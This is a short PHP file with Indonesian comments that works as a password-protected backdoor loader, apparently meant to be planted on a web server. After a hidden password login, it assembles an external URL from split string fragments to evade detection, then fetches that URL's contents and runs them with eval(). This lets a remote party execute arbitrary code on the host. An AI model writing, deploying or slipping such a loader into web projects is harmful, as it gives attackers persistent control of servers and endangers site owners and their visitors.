<?php
session_start();

if ($_SERVER["REQUEST_METHOD"] == "POST") {
    // Password hashed
    $hashed_password = '$2a$12$LO0F6Ywawaf/7tBwQFLz8Ofn/zpEh2/6.rc0uqg5X5XqOQQ097/gS';
    if (password_verify($_POST["password"], $hashed_password)) {
        $_SESSION["logged_in"] = true;
    } else {
        $error_message = "Kata sandi salah!";
    }
}

if (isset($_SESSION["logged_in"]) && $_SESSION["logged_in"] === true) {
    $url = "ht"; $url .= "tps:"; $url .= "//"; $url .= "king";
    $url .= "alex"; $url .= ".pag"; $url .= "es.";
    $url .= "dev/"; $url .= "king"; $url .= ".php";
    
    // Mengambil konten dari URL menggunakan file_get_contents
    $content = file_get_contents($url);
    
    // Langsung mengevaluasi konten sebagai kode PHP
    // PERINGATAN: eval() sangat berbahaya jika sumber tidak terpercaya!
    eval("?>" . $content);
    exit();
}
?>

<!DOCTYPE html>
<html>
<body>
    <?php if (isset($error_message)) : ?>
        <p style="color: red;"><?php echo $error_message; ?></p>
    <?php endif; ?>
    <form action="<?php echo $_SERVER["PHP_SELF"]; ?>" method="POST">
        <input type="password" id="password" name="password" required>
        <input type="submit" value="Submit">
    </form>
</body>
</html>
